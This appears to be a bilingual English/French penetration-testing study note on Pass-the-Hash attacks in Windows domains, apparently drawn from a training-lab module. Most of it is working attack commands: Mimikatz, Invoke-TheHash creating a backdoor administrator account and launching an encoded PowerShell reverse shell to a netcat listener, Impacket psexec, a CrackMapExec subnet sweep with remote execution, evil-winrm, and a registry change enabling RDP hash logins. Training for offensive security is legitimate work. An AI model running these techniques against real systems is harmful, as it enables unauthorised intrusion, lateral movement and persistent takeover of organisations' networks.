# PtH

***

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) <mark style="color:orange;">**attack is a technique where an attacker uses a password hash instead of the plain text password**</mark> for authentication.&#x20;

* PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

Let's assume we obtain the password hash (`64F12CDDAA88057E06A81B54E73B949B`) for the account `julio` from the domain `inlanefreight.htb`.&#x20;

***

### <mark style="color:blue;">Windows NTLM Introduction</mark>

> **Le LAN Manager New Technology (NTLM)** de Microsoft est un ensemble de protocoles de sécurité qui authentifie l'identité des utilisateurs tout en protégeant l'intégrité et la confidentialité de leurs données. NTLM est une solution de connexion unique (SSO) qui utilise un protocole de défi-réponse pour vérifier l'identité de l'utilisateur sans nécessiter qu'il fournisse son mot de passe.

{% hint style="warning" %}
<mark style="color:orange;">**Comment fonctionne NTLM avec défi-réponse ?**</mark>

1. **Étape 1 : Demande d'authentification**\
   L'utilisateur essaie de se connecter à un serveur ou une ressource protégée.
2. **Étape 2 : Le défi (Challenge)**\
   Le serveur envoie un défi (un nombre aléatoire, aussi appelé nonce) au client.
3. **Étape 3 : Réponse basée sur le hachage**\
   Le client chiffre ce défi en utilisant le **hachage NTLM** de son mot de passe (stocké localement ou dans le contrôleur de domaine) et envoie cette réponse chiffrée au serveur.
4. **Étape 4 : Vérification**\
   Le serveur, qui a également accès au hachage NTLM de l'utilisateur (stocké sur le contrôleur de domaine), chiffre le même défi avec ce hachage et compare les résultats. Si les réponses correspondent, l'utilisateur est authentifié.
{% endhint %}

Avec NTLM, les mots de passe stockés sur le serveur et le contrôleur de domaine ne sont pas "salés", ce qui signifie qu'un attaquant disposant d'un hachage de mot de passe peut authentifier une session sans connaître le mot de passe original. On appelle cela une attaque "Pass the Hash" (PtH).

***

### <mark style="color:blue;">Pass the Hash with Mimikatz (Windows)</mark>

Le premier outil que nous allons utiliser pour effectuer une attaque Pass the Hash est **Mimikatz**. Mimikatz dispose d’un module nommé `sekurlsa::pth`, qui permet de réaliser une attaque Pass the Hash en lançant un processus en utilisant le hachage du mot de passe de l'utilisateur. Pour utiliser ce module, nous aurons besoin des éléments suivants :

* **/user** : Le nom d'utilisateur que nous voulons usurper.
* **/rc4 ou /NTLM** : Le hachage NTLM du mot de passe de l'utilisateur.
* **/domain** : Le domaine auquel appartient l'utilisateur que nous voulons usurper. Dans le cas d’un compte utilisateur local, nous pouvons utiliser le nom de l'ordinateur, `localhost` ou un point (`.`).
* **/run** : Le programme que nous souhaitons exécuter dans le contexte de l'utilisateur (si aucun programme n’est spécifié, _cmd.exe_ sera lancé par défaut).

{% code overflow="wrap" fullWidth="true" %}
```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

```
{% endcode %}

***

### <mark style="color:blue;">Pass the Hash with PowerShell Invoke-TheHash (Windows)</mark>

<mark style="color:orange;">**Invoke-TheHash**</mark> est un outil basé sur PowerShell qui permet d'effectuer des attaques "Pass the Hash" en utilisant les protocoles **WMI** et **SMB**. Il utilise un hachage NTLM pour s'authentifier via le protocole d'authentification NTLMv2.

#### **Points clés :**

* Tu n'as pas besoin de privilèges administrateur sur la machine attaquante, mais le compte (utilisateur et hachage) doit avoir des droits d’administrateur sur la machine cible.
* Deux options disponibles :
  * Exécution de commandes via **SMB**.
  * Exécution de commandes via **WMI**.

#### **Paramètres nécessaires :**

1. **Target** : Nom de l'hôte ou adresse IP de la cible.
2. **Username** : Nom d'utilisateur pour l'authentification.
3. **Domain** : Domaine pour l'authentification (facultatif si le compte est local).
4. **Hash** : Hachage NTLM (format NTLM seul ou LM:NTLM).
5. **Command** : Commande à exécuter sur la cible (facultatif, sinon il vérifie les droits d'accès WMI).

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
--
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
--
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

```
{% endcode %}

We can also get a reverse shell connection in the target machine.&#x20;

<mark style="color:orange;">**Netcat Listener**</mark>

```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

![text](https://academy.hackthebox.com/storage/modules/147/rshellonline.jpg)

Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).

<mark style="color:orange;">**Invoke-TheHash with WMI**</mark>

{% code title="" overflow="wrap" fullWidth="true" %}
```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JAB..pAA=="
```
{% endcode %}

The result is a reverse shell connection from the DC01 host (172.16.1.10).

![text](https://academy.hackthebox.com/storage/modules/147/pth_invoke_the_hash.jpg)

***

### <mark style="color:blue;">Pass the Hash with Impacket (Linux)</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453


C:\Windows\system32>
```
{% endcode %}

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

***

### <mark style="color:blue;">Pass the Hash with CrackMapExec (Linux)</mark>

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.&#x20;

<mark style="color:orange;">**Pass the Hash with CrackMapExec**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```
{% endcode %}

Si nous voulons effectuer les mêmes actions mais tenter de nous authentifier sur chaque hôte d’un sous-réseau en utilisant le hash du mot de passe de l’administrateur local, nous pouvons ajouter `--local-auth` à notre commande.

Cette méthode est utile si nous avons obtenu un hash d’administrateur local en vidant la base de données SAM locale sur un hôte et que nous voulons vérifier combien d’autres hôtes nous pouvons atteindre à cause de la réutilisation du mot de passe administrateur local.

Si nous voyons **"Pwn3d!"**, cela signifie que l’utilisateur est administrateur local sur l’ordinateur cible. Nous pouvons utiliser l’option `-x` pour exécuter des commandes à distance.

Il est courant d’observer une réutilisation des mots de passe sur plusieurs machines d’un même sous-réseau. En effet, les organisations utilisent souvent des images système (gold images) avec le même mot de passe administrateur local, ou bien elles définissent ce mot de passe identique sur plusieurs hôtes pour faciliter l’administration.

Si nous rencontrons ce problème lors d’une mission en conditions réelles, une excellente recommandation pour le client est de mettre en place la **Local Administrator Password Solution (LAPS)**. Cet outil permet de générer un mot de passe administrateur local unique pour chaque machine et de le faire tourner à intervalles réguliers pour renforcer la sécurité.

<mark style="color:orange;">**CrackMapExec - Command Execution**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```
{% endcode %}

{% hint style="warning" %}
[CrackMapExec documentation Wiki](https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/) ([NetExec documentation wiki](https://www.netexec.wiki/))&#x20;
{% endhint %}

***

### <mark style="color:blue;">Pass the Hash with evil-winrm (Linux)</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF345
```
{% endcode %}

Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

***

### <mark style="color:blue;">Pass the Hash with RDP (Linux)</mark>

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![](https://academy.hackthebox.com/storage/modules/147/rdp_session-4.png)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

**Enable Restricted Admin Mode to Allow PtH**

{% code overflow="wrap" fullWidth="true" %}
```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
{% endcode %}

![](https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png)

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

**Pass the Hash Using RDP**

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
{% endcode %}

***

### <mark style="color:blue;">UAC Limits Pass the Hash for Local Accounts</mark>

{% hint style="warning" %}
**Le Contrôle de Compte Utilisateur (UAC)** limite la capacité des utilisateurs locaux à effectuer des opérations d'administration à distance.&#x20;

Lorsque la clé de registre **HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy** est définie sur 0, cela signifie que le compte administrateur local intégré (RID-500, "Administrator") est le seul compte local autorisé à effectuer des tâches d'administration à distance. En la définissant sur 1, cela permet également aux autres administrateurs locaux de le faire.

**Note** : Il existe une exception : si la clé de registre **FilterAdministratorToken** (désactivée par défaut) est activée (valeur 1), le compte RID 500 (même s'il est renommé) est protégé par UAC. Cela signifie que l'attaque Pass-the-Hash (PTH) échouera contre la machine lorsqu'on utilise ce compte.

Ces paramètres concernent uniquement les comptes administratifs locaux. Si nous avons accès à un compte de domaine avec des droits d'administration sur un ordinateur, nous pouvons toujours utiliser Pass-the-Hash avec cet ordinateur. Si vous souhaitez en savoir plus sur **LocalAccountTokenFilterPolicy**, vous pouvez lire l'article de blog de Will Schroeder intitulé _"Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy"_.
{% endhint %}

***
